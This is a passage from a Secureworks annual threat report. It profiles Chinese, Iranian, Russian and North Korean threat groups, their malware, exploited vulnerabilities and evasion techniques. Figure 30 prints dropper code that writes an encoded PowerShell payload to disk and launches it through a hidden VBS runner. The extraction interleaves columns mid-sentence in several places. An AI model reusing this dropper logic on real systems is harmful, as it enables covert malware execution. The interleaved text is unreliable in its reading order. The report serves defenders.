PRESIDENT52 used a malicious PowerPoint file to drop an executable 

and a DLL file to disk. The executable file imports the DLL, which 

decodes an embedded Cobalt Strike Beacon and loads it into memory 

(figure 27\).

Use of DLL search order hijacking to get a malicious DLL to decode 

and load various payloads, such as PlugX or Cobalt Strike, is typical of 

BRONZE PRESIDENT. The threat group puts effort into varying the DLL 

loaders, which are highly obfuscated and rarely stay the same from 

one campaign to the next. In another example53, BRONZE PRESIDENT 

targeted Russian speakers with a fake PDF that downloaded a decoy 

document as well as files for a DLL search order hijack, and ultimately 

decoded and ran a PlugX binary. The PlugX payload would only exist on 

disk as an encrypted blob of data. The loader will decrypt it in memory 

and then pass execution to the payload.

In a BRONZE UNIVERSITY54 attack that deployed ShadowPad, the 

threat actor again used again a DLL search order hijack to load 

the malware. As part of this execution chain, the ShadowPad DLL 

loader checks for specific bytes in its parent process (log.exe). If 

the loader finds these bytes, it 'patches' them with an instruction to 

call a specific function in the DLL loader. Figure 28 shows this code 

in a sample (MD5: 3e372906248b215ea0ee853cb4e29dd8\) that a 

submitter in Taiwan uploaded to VirusTotal in September. The encrypted 

ShadowPad payload was hidden in the Windows registry.

Figure 27\. BRONZE PRESIDENT Cobalt Strike Beacon shellcode in memory. 
(Source: Secureworks) 

Figure 28\. ShadowPad patching function. (Source: Secureworks)

2022 State of the Threat: A Year in Review

40

Letter From Our CTIO

Executive Summary 
and Key Findings

ShadowPad Continues 
to be Popular

The ShadowPad55 advanced modular RAT is now used by over ten 

different Chinese threat groups. This consolidates its position alongside 

PlugX as one of the most prevalent RATs used by multiple Chinese 

Ransomware Remains the 
Primary Strategic Threat

threat groups.

The majority of ShadowPad samples analyzed by CTU researchers use 

two\-file execution chains, where the encrypted ShadowPad payload is 

embedded within the DLL loader. However, CTU researchers identified 

campaigns attributed to the BRONZE UNIVERSITY threat group that 

used a three\-file execution chain, with the encrypted ShadowPad 

payload dropped as a separate file. 

During a January 2022 incident response engagement, Secureworks 

CTU researchers discovered that BRONZE UNIVERSITY had used 

this three\-file ShadowPad execution chain in November 2021\. Initial 

access was via a server running a vulnerable version of ManageEngine 

ADSelfService Plus. The threat actor exploited CVE\-2021\-405393, 

an authentication bypass vulnerability affecting ManageEngine 

ADSelfService Plus software builds up to version 6113 and deployed the 

China Chopper web shell.

The threat actor used a three\-file execution chain to deploy variants 

of ShadowPad, first to the initial server to gain a foothold and then to 

other servers in the network. The threat actor used ShadowPad for 

reconnaissance, credential harvesting, and to control the compromised 

hosts, including for further information gathering.

01

02

03

04

05

06
06

07

07

08

08
09

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 29\. Timeline of ShadowPad execution, service creation, and payload injection. (Source: Secureworks)

2022 State of the Threat: A Year in Review

41

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Iran 

Traditional Targeting

Main Motivations: 

Espionage

Monitoring dissidents

Sabotage

2022 State of the Threat: A Year in Review

42

 
 
 
Iran 

Iranian APT group activity overall remained focused on traditional 

the Islamic Revolutionary Guard Corps (IRGC) as providing malware 

targets: Israel, other Middle Eastern countries, and dissidents at home 

development services in support of COBALT FIRESIDE59 (also known 

and abroad amongst its diaspora community. Over the year, links 

as Tortoiseshell and Imperial Kitten). Threat actors within COBALT 

between certain groups and government entities became clearer. 

FIRESIDE have been using the Facebook platform to approach targets 

Some groups continued the use of pseudo\-ransomware and tunneling 

before moving the conversations off\-platform to other mediums (such 

techniques were used in a wide variety of attacks.

as email, messaging and collaboration services, and websites) to 

Iranian Group Links to Government 
Become Clearer

The tasking of COBALT ULSTER56, also known as Seedworm 

or MuddyWater, became less muddy in January 2022 when a 

publication57 from U.S. Cyber Command's Cyber National Mission 

Force attributed the group to the Iranian Ministry of Intelligence 

distribute malware to the targets.

In addition, a grand jury indictment in October 2021 in the U.S. District 

Court for the Southern District of New York of two contractors of 

Emennet Pasargad also highlighted connections between supposedly 

independent cybersecurity companies in Iran and the Iranian 

government. The contractors, both Iranian nationals, were indicted 

for computer intrusion, computer fraud, voter intimidation, interstate 

and Security (also known as MOIS or VAJA). The reporting refers to 

threats, and conspiracy offenses for their alleged participation in a 

COBALT ULSTER as a "subordinate element", which leaves open the 

campaign aimed at influencing and interfering with the 2020 U.S. 

possibility that MOIS may direct the group but not directly employ it. 

Presidential Election. The messages were designed to appear as if 

they had been sent60 by a U.S. far\-right political activist group known 

Contracting out to commercial contractors in Iran is a common 

as the Proud Boys.

operating model. In July 2021, Facebook identified58 commercial 

entity Mahak Rayan Afraz (MRA), an IT company in Tehran with ties to 

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

43

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Iranian Groups Love to Tunnel 

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

CTU researchers observed COBALT MIRAGE61 using ngrok and Fast 

COBALT LYCEUM65 used MilanRAT for DNS tunneling for C2 

Reverse Proxy for tunneling in its ransomware campaign against U.S. 

communication. The group debuted MilanRAT in June 2021 in a 

targets. Third\-party reporting62 also reinforced the extent to which 

campaign against Israeli targets, in which it set up a spoof website 

Iranian groups make use of tunneling tools. Open source tunneling 

impersonating Israel\-based software company Chip PC Technologies. It 

tools employed by COBALT ULSTER were reported to include Chisel, 

used this website in two infection chains that ended in the deployment 

Secure Socket Funneling (SSF), Ligolo and SharpChisel. 

of MilanRAT. This formed part of a pivot towards targeting Israel.

Ngrok has also been used by COBALT FOXGLOVE63 since at least 

2020 in phishing attacks and by COBALT AGORA64\. This latter group 

focuses on organizations in the United Arab Emirates, and in November 

debuted new malware that CTU researchers refer to as G0Dx. G0Dx 

provides basic RAT functionality: file upload, file download, and arbitrary 

command execution via cmd.exe. It communicates with C2 servers via 

HTTP and DNS. 

fh.WriteLine("$data \- \[System.Convert]::FromBase64String("\+"\\"\[BASE 64 ENCODED POWERSHELL PAYLOAD]""\+")");
fh.WriteLine("$decoded \- \[System.Text.Encoding]::UTF8\.GetString($data)");
fh.Writeline("$path \- $env:ALLUSERSPROFILE");
fh.WriteLine("New\-Item \-Path $path"\+"'\\\\Windows'"\+" \-ItemType Directory \> $null");
fh.WriteLine("$decoded \> $path"\+"'\\\\Windows\\\\System.ps1'");
fh.WriteLine("$vbln1\-'set objsh\- CreateObject(\\"WScript.Shell\\")'");
fh.WriteLine("$vbln2\-'obish.run \\"powershell.exe \-exec bypass \-windowstyle hidden \-NonInteractive \-noprofile \-FILE
%programdata%\\\\Windows\\\\System.ps1\\",0, false'");
fh.Writeline("echo $vbln1 \> C:\\\\ProgramData\\\\Windows\\\\runfile.vbs");
fh.WriteLine("echo $vbln2 \>\> C:\\\\ProgramData\\\\Windows\\\\runfile.vbs");
fh.Close();

• C:\\ProgramData\\MsNpENg\\
• C:\\ProgramData\\MsNpENg\\Database.MDF
• C:\\ProgramData\\MsNpENg\\Log
• C:\\ProgramData\\MsNpENg\\Log\\\[a\-z0\-9]{8}d
• C:\\ProgramData\\MsNpENg\\Log\\\[a\-z0\-9]{8}f
• C:\\ProgramData\\MsNpENg\\Log\\\[a\-z0\-9]{8}g
• C:\\ProgramData\\MsNpENg\\Log\\\[a\-z0\-9]{8}s
• C:\\ProgramData\\MsNpENg\\MsNpENg
• C:\\ProgramData\\MsNpENg\\curent.txt

Figure 31\. Files created by MilanRAT. (Source: Secureworks)

A new cluster of Iranian activity emerged in June 2022\. It uses a 

.NET based DNS Backdoor referred to as DnsSystem, thought to be 

a customized version of the DIG.net open\-source tool. The malware 

Figure 30\. Code extract from a G0Dx dropper. (Source: Secureworks)

communicates via DNS tunneling, leveraging DNS queries to exchange 

C2 traffic with an adversary controlled nameserver. However, in 

contrast to some third\-party reporting, CTU researchers do not 

associate this activity with COBALT LYCEUM.

2022 State of the Threat: A Year in Review

44

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Iranian Ransomware Continues, 
With Limited Impact

Ransomware has continued to develop as a theme across Iranian 

In November 2021, U.S., Australian, and British government agencies 

threat group activity in the last 12 months, although it is not always 

issued a joint advisory69 detailing exploitation since at least March 

clear what the attacks are intended to achieve. Often, they appear to 

2021 of Fortinet vulnerabilities by an Iranian group in order to gain initial 

be used for disruption rather than financial gain.

access to systems. The group also exploited the Microsoft Exchange 

Over the past year, Secureworks incident responders have investigated 

CTU researchers attribute the activity detailed in the advisory to 

ProxyShell vulnerability since at least October 2021 for initial access. 

COBALT MIRAGE ransomware attacks against organizations in Israel, 

COBALT MIRAGE.

the U.S., Europe, and Australia. Elements of COBALT MIRAGE activity 

were reported as PHOSPHORUS66 and TunnelVision67, and the group 

COBALT MIRAGE's ransomware attacks exploit popular remote code 

is thought linked to COBALT ILLUSION68 (which predominantly uses 

vulnerabilities (like ProxyShell or Log4Shell) to obtain access, deploy 

persistent phishing campaigns to obtain initial access in espionage\-

tunneling tools including ngrok and FRP, and finally use BitLocker and/

related campaigns). 

or DiskCryptor to attempt to encrypt systems, not always successfully.

• Exploit Proxy Shell on 
 Exchange server
• Drop web shells 

• Activate DefaultAccount
• Deploy scripts/tunneling tools
• Move laterally

• Activate BitLocker on 
 three hosts

• Send ransom note to printer

ON OR BEFORE 2022\-01\-06

2022\-01\-06 THROUGH 2022\-01\-10

Figure 32: COBALT MIRAGE actions in a January 2022 intrusion leading to use of BitLocker. (Source: Secureworks)

2022 State of the Threat: A Year in Review

45

 
01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

COBALT MIRAGE also carries out espionage activity, some of which 

may also incorporate ransomware activity. However, while the group 

appears to have had a reasonable level of success gaining initial 

access to a wide range of targets, its ability to capitalize on that 

access for financial gain or intelligence collection appears limited. Even 

so, at a minimum, COBALT MIRAGE's ability to use publicly available 

encryption tools for ransomware operations and mass scan\-and\-exploit 

activity to compromise organizations creates an ongoing threat.

This group sits alongside several other Iranian threat groups that are 

also now targeting Israel with both espionage operations and disruptive 

campaigns under the guise of ransomware attacks. These include 

groups like N3tw0rm, COBALT SHADOW70 (also known as Agrius), and 

hack and leak operations like Moses Staff.

Moses Staff, tracked by CTU researchers as COBALT SAPLING71, 

portrays itself as a pro\-Palestinian group intent on using cyberattacks 

and content on its leak site to intimidate entities in Israel. CTU 

researchers assess it more likely that this operation is part of ongoing 

efforts by Iran\-linked pseudo\-ransomware groups to harass and 

disrupt Israeli businesses. COBALT SAPLING is another group using 

ransomware style malware for disruption rather than financial gain, 

having used72 PyDcrypt, DCSrv, and Strifewater73 against targets 

in Israel. While COBALT SAPLING is known to leak data from their 

own intrusions, it is also possible that some of the data listed on the 

leak site may have been obtained from other sources or intrusions 

conducted by other threat actors.

2022 State of the Threat: A Year in Review

46

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Russia 

The Near Abroad and a Nod 
to the 'Problems' of Cybercrime

Main Motivations: 

Espionage

Hybrid Warfare

2022 State of the Threat: A Year in Review

47

 
 
01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Russia

Russia's advanced cyber capabilities support the aims of its foreign 

policy to counter Western influence at home and on its near neighbors, 

and to advance Russia's position as a leader in world affairs. Russia 

regards the West, especially the North Atlantic Treaty Organization 

(NATO) alliance, as an ongoing and central threat to the national 

interests of the Russian Federation.

Combatting Cybercrime… 
Selectively

Following the Putin\-Biden Summit in June 2021, Russia showed 

signs of dealing with its resident cybercriminals. In September 

2021 part of the Meris botnet was sinkholed after it attacked 

Russian targets. In January 2022 the FSB arrested 14 alleged 

members of the GOLD SOUTHFIELD (REvil) ransomware 
group, and in February74 Russian authorities shut down three 
carding forums, plus one selling RDP access to compromised 

environments, and arrested the CEO of a Russia\-based domain 

registrar. However, these arrests have not had a significant 

impact on the cybercrime landscape, and for the most part 

Russia\-based cybercriminals continue to operate with impunity 

so long as they do not target Russian interests. Cooperation 

with the U.S. essentially ceased following the invasion 

of Ukraine.

What the War in Ukraine 
has Revealed About Russia’s 
Cyber Capabilities

In the run\-up to the Russian invasion of Ukraine there were valid 

concerns that destructive cyber capabilities would be deployed on a 

wide\-scale against Ukrainian critical infrastructure and spread beyond 

Ukraine's borders, as occurred with NotPetya75 in 2017\. 

Those fears appeared unfounded as of late June, with the wiper 

attack76 targeting Viasat being one of only a handful of examples 

of cyberattacks that had effects outside of Ukraine. Equally, there 

has been extensive coverage of disruptive attacks by hacktivists on 

both sides of the conflict, but their impact has been minor. For most 

Secureworks customers, especially those without operations in Ukraine 

or Russia, the impact has been very limited, with ransomware and other 

cybercriminal activity remaining a far greater threat.

2022 State of the Threat: A Year in Review

48

 
 
 
01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

However, the regular stream of reporting77 from the Computer 

threat group, and some of it from China82\. During a public presentation 

Emergency Response Team of Ukraine (CERT\-UA) describes a steady 

at the First conference in June 2022, CERT\-UA revealed that it was 

cadence of cyber activity directed against Ukrainian targets. Some 

tracking 43 threat groups and 1,306 cyber incidents so far in 2022\. It is 

of this activity is identifiably78 from Russian government\-sponsored 

likely that the full effect of how Russian cyber capability has been used 

threat actors, some of it79 from threat actors using cybercriminal 

to support the military operations is not yet apparent to observers 

tooling (although that may be to hide its origin), some of it from 

outside of Ukraine.

hacktivists, some80 from the potentially Belarussian MOONSCAPE81 

Ukraine Major Cyber Event Timeline

JANUARY 13\-14

FEBRUARY 15

FEBRUARY 24

MARCH 28

Cyber attacks using 
WhisperGate wiper malware, 
tentatively attributed by the 
Ukrainian government to a 
Belarus\-aligned group called 
MOONSCAPE (also known 
as Ghostwriter or UNC1151\), 
deface and take down more 
than a dozen Ukrainian 
government websites.

A series of DDOS attacks 
knocked ofﬂine websites 
belonging to the Ukrainian 
army, defense ministry, 
and publicly\-owned banks.

A cyberattack against Viasat’s 
satellite KA\-SAT network, likely 
intended to hamper Ukrainian 
communications during Russian 
invasion, causes collateral 
damage in western Europe.

Ukrainian ﬁxed\-line operator 
Ukrtelecom conﬁrms a 
cyberattack on its core 
infrastructure, describes as 
the most severe cyberattack 
since the start of the Russian 
invasion in February.

JANUARY 23

FEBRUARY 24

FEBRUARY 24

MARCH 15

MAY 15

A series of DDoS and 
destructive wiper 
attacks using 
HermeticWiper 
take place against 
Ukrainian targets.

A second wiper, dubbed 
IsaacWiper is used in a 
destructive attack 
against a Ukrainian 
governmental network.

Russia invades 
Ukraine.

A third wiper named 
CaddyWiper is 
detected in use against 
Ukrainian networks.

Russia\-supporting 
hacktivistgroup Killnet 
threatens a wave of 
cyberattacks against 
the U.S. and multiple 
European countries.

Figure 33: Timeline of significant initial activity connected with the Russian invasion of Ukraine. (Source: Secureworks)

2022 State of the Threat: A Year in Review

49

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

CTU researchers have observed limited Russian threat group activity 

beyond what has been reported in open source. Of the Russian groups 

tracked by CTU researchers, IRON TILDEN83 has been the most 

visible, conducting spear phishing attacks primarily against neighboring 

Ukraine but also against Latvia’s Parliament in April.

IRON TILDEN Threat Group Profile

IRON TILDEN, also known as Gamaredon, has a history of 

conducting cyber espionage against Ukrainian targets of 

interest, primarily in the government and defense verticals. 

Active since at least 2013, the threat group's operations 

typically consist of aggressive spear phishing campaigns that 

utilize malicious VBA scripts inside attached Microsoft Word or 

Excel documents, designed to install information stealers on 

compromised hosts. IRON TILDEN sacrifices some operational 

security in favor of high tempo operations, meaning that its 

infrastructure is identifiable through re\-use of specific Dynamic 

DNS providers, Russian hosting providers, and remote template 

injection techniques.

In November 2021, the Security Service of Ukraine (SSU) 

identified five IRON TILDEN members as officers in Russia's 

FSB federal security service. Targeting the Saeima (the Latvian 

parliament) aligns with the FSB's efforts to collect intelligence 

on countries surrounding Russia. Latvia has endorsed Ukraine's 

bid to join the European Union and passed measures that 

support Ukraine and condemn Russian hostilities. These actions 

could increase attention from foreign threat groups focused on 

espionage.

2022 State of the Threat: A Year in Review

50

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Before the invasion, CTU researchers assessed that Russia would only 

Ukraine have a broader impact, as was the case with the Viasat wiper 

launch direct disruptive attacks against organizations in NATO member 

attack. However, Russia is likely attempting to calibrate its activity to 

countries if there was a drastic escalation in tensions. That assessment 

avoid collateral damage that might provoke a more direct international 

remains unchanged. There remains the possibility that attacks targeting 

response. 

IRON LIBERTY84
(Espionage)

16th Center

• BROMINE (Microsoft)
• Energetic Bear / Berserk Bear (CrowdStrike)
• TEMP.Isotope (FireEye)
• ALLANITE (Dragos)
• Crouching Yeti (Kaspersky)
• Dragonﬂy (Symantec)
• DYMALLOY (Dragos)

Federal Security
Service (FSB)

IRON HUNTER85
(Espionage)

18th Center

IRON TILDEN
(Espionage)

• Turla
• KRYPTON (Microsoft)
• Venomous Bear (CrowdStrike)
• ITG12 (IBM)
• Waterburg (Symantec)

• ACTINIUM (Microsoft)
• Primitive Bear (CrowdStrike)
• Armageddon
• Blue Otso (PwC)
• Dancing Salome (Kaspersky) 
• Gamaredon
• Shuckworm (Symantec)
• UAC\-0010 (CERT\-UA)
• WinterFlounder (iDefense)

Figure 34\. Russian threat groups tracked by CTU researchers. (Source: Secureworks)

Foreign Intelligence 

Service (SVR)

• YTTRIUM (Microsoft)
• Cozy Bear (CrowdStrike)
• APT29 (FireEye)
• The Dukes
• UNC2452 (Mandiant)

• NOBELIUM (Microsoft)

• Dark Halo (Volexity)

• StellarParticle (CrowdStrike)

• UNC2452 (FireEye)

2022 State of the Threat: A Year in Review

51

Federal Security

Service (FSB)

16th Center

18th Center

• BROMINE (Microsoft)

• Energetic Bear / Berserk Bear (CrowdStrike)

• TEMP.Isotope (FireEye)

• ALLANITE (Dragos)

• Crouching Yeti (Kaspersky)

• Dragonﬂy (Symantec)

• DYMALLOY (Dragos)

• Turla

• KRYPTON (Microsoft)

• Venomous Bear (CrowdStrike)

• ITG12 (IBM)

• Waterburg (Symantec)

• ACTINIUM (Microsoft)

• Primitive Bear (CrowdStrike)

• Armageddon

• Blue Otso (PwC)

• Dancing Salome (Kaspersky) 

• Gamaredon

• Shuckworm (Symantec)

• UAC\-0010 (CERT\-UA)

• WinterFlounder (iDefense)

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Foreign Intelligence 
Service (SVR)

IRON HEMLOCK86
(Espionage)

• YTTRIUM (Microsoft)
• Cozy Bear (CrowdStrike)
• APT29 (FireEye)
• The Dukes
• UNC2452 (Mandiant)

IRON RITUAL87
(Espionage)

• NOBELIUM (Microsoft)
• Dark Halo (Volexity)
• StellarParticle (CrowdStrike)
• UNC2452 (FireEye)

85th Main Special
Service Center
(GTsSS)

IRON TWILIGHT88
(Espionage)

Main Intelligence 
Directorate (GU/GRU)

Main Center of 
Special Technologies

IRON VIKING89
(Sabotage)

• STRONTIUM (Microsoft)
• Fancy Bear (CrowdStrike)
• APT28 (FireEye)
• Group 74 (Talos)
• PawnStorm (Trend Micro)
• Sednit (ESET)
• Snakemackerel (iDefense)
• Sofacy (Palo Alto)
• TG\-4127 (SCWX CTU)
• Tsar Team (iSight)

• IRIDIUM (Microsoft)
• BlackEnergy Group
• CTG\-7263 (SCWX CTU)
• ELECTRUM (Dragos)
• Hades/OlympicDestroyer (Kaspersky)
• IRIDIUM (Microsoft)
• Qudedagh (F\-Secure)
• Sandworm Team (Trend Micro)
• Telebots (ESET)
• TEMP.Noble (FireEye)
• Voodoo Bear (CrowdStrike)

Figure 34 (cont.). Russian threat groups tracked by CTU researchers. (Source: Secureworks)

2022 State of the Threat: A Year in Review

52

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Democratic People's 
Republic of Korea 
Revenue Remains the Major Focus

Main Motivations: 

Financial Gain

Espionage

2022 State of the Threat: A Year in Review

53

 
 
01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

North Korea

For most North Korean threat groups, acquisitive crime remains the 

cryptocurrency exchanges since 2018, with some single thefts 

major priority to provide income for the pariah state. This tasking is 

exceeding that amount. The focus has more recently expanded to 

predominantly driven by the United Nations (UN) sanctions imposed 

decentralized finance (DeFi) organizations, their global cryptocurrency 

on North Korea because of the country's ongoing engagement in a 

exchanges, and their users. In March 2022, NICKEL GLADSTONE94 

nuclear weapons program. An expansion of effort in the past few years 

compromised some of the validator nodes of Ronin, an Ethereum\-

is likely driven by the impact on the North Korean economy from the 

based cryptocurrency wallet built and operated by Sky Mavis, resulting 

COVID\-19 pandemic. This crisis exacerbated the effects of sanctions 

in theft of cryptocurrency then valued at over $540 million USD, 

and isolated the DPRK from China, its closest trading partner. DPRK\-

making it one of the largest cryptocurrency heists ever.

related threat groups appear to be under pressure to replenish the 

country's diminishing coffers. 

In April 2022, U.S. agencies updated their reporting95 on NICKEL 

GLADSTONE's activities, including the use of AppleJeus cryptocurrency 

The main exception is a continuation through 2022 of NICKEL 

malware, stating that as of April the group had targeted various firms, 

ACADEMY's90 Operation Dream Job, which targeted the defense 

entities, and exchanges in the blockchain and cryptocurrency industry 

and aerospace sectors in 2020 with fake job offers, leading to the 

using spear\-phishing campaigns and malware to steal cryptocurrency. 

installation of malware. Recently, the focus91 has been on the chemical 

A second campaign, named TraderTraitor, involved a set of malicious 

sector. NICKEL KIMBALL92 activity also continued its focus on cyber 

cryptocurrency trading applications that targeted employees of 

espionage and intelligence activities aimed at South Korean targets. 

organizations engaged in blockchain research. CTU researchers 

Cryptocurrency in Their Sights

Cryptocurrency and decentralized finance organizations (DeFi) 

have been a major focus of activity. North Korean threat groups 

have reportedly93 stolen over $200 million USD annually from 

identified an additional phishing campaign that specifically targeted 

cryptocurrency exchanges, which started in mid\-2020 but has links to 

activity from mid\-2019 that was not attributed at the time. Analysis of 

the infrastructure used across the campaigns suggests that NICKEL 

GLADSTONE was responsible for these incidents.

2022 State of the Threat: A Year in Review

54

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

U.S. Agencies Strike Back

Also in April 2022, the U.S. Treasury Department OFAC added96 an 

Multiple ransomware families have been linked to North Korea including 

Ethereum wallet to its sanctions list after the wallet was used to launder 

TFlower, Maui, VHD Locker, PXJ, ZZZZ, BEAF, and ChiChi. None of these 

stolen funds from the Ronin theft. OFAC attributed this wallet to North 

have appeared in the Secureworks incident response case load to 

Korean threat actors. It is unclear how effective the inclusion of the 

date. This suggests that either the scale of these campaigns is not on 

Ethereum wallet on the OFAC sanctions list will be, given that it is just 

par with those of the established, mainly Russian\-speaking cybercrime 

one wallet, although it will make moving the funds harder and any 

groups or that the victims fall outside of the geographies generally 

associated activity will attract increased scrutiny. The move also signals 

serviced by Secureworks.

that OFAC does not view cryptocurrencies as outside their remit, or the 

threat actors that use them as being untouchable. Also in March, the 

Nevertheless, the continued emergence of samples and evolution of 

U.S. Justice Department announced that a former Ethereum developer 

these ransomware families strongly suggests that this is one stream of 

had been sentenced to over five years in prison for presenting at a 

revenue that North Korean operators will continue to pursue. Indeed, 

cryptocurrency conference in North Korea without obtaining a license 

ransomware may become an even greater focus than cryptocurrency 

from OFAC to attend.

North Korean Ransomware 
Refilling State Coffers

North Korean groups continue to carry out ransomware attacks, which 

are unambiguously for financial gain, although their scale and success 

rate remains unclear.

theft as a result of the volatility of cryptocurrencies. While the value 

realized from the theft of cryptocurrency reserves is sensitive to 

changes in the value of that cryptocurrency, with ransomware the 

extortion demand can be increased to maintain the real\-term value to 

the threat actors. 

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

55

07
Defense Evasion 
Offers Its Own 
Detection 
Opportunities

To detect an intrusion before significant damage is done, network 

defenders need to identify threat actor activity before the adversary 

achieves their objectives. Network defenders really only need to 'get 

lucky' once, but then must capitalize on that luck by reacting quickly. 

Organizations ‘make their own luck’ through widespread monitoring 

and well\-rehearsed incident response plans. 

Unsurprisingly, threat actors attempt to counter this by employing 

evasion measures designed to circumvent security controls. However, 

the use of an evasion technique sets its own pattern that can be 

monitored for and used to detect adversary activity. 

Observed evasion techniques break down into two broad categories: 

operational design choices made prior to an intrusion, and tactical 

actions once inside a network to shape the environment in a way that 

benefits the attacker and hinders network defenders.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\- 
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

56

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Evasion by Design

When compiling malware, developers are turning to specific 

Hook removal and breakpoint detection. Looking for and 

techniques to make their code harder to detect and therefore likely to 

disabling API hooking, commonly used by EDR tools to 

survive longer in the environments they deploy it to. These techniques 

intercept and record system API calls, is a technique used 

include: 

by malware such as GuLoader99\. Other evasion techniques 

implemented by commodity malware such as GuLoader, 

Use of less common languages such as Rust and Go for 

FormBook and BazarLoader include detecting and avoiding 

malware development. Newer languages are, in some cases, 

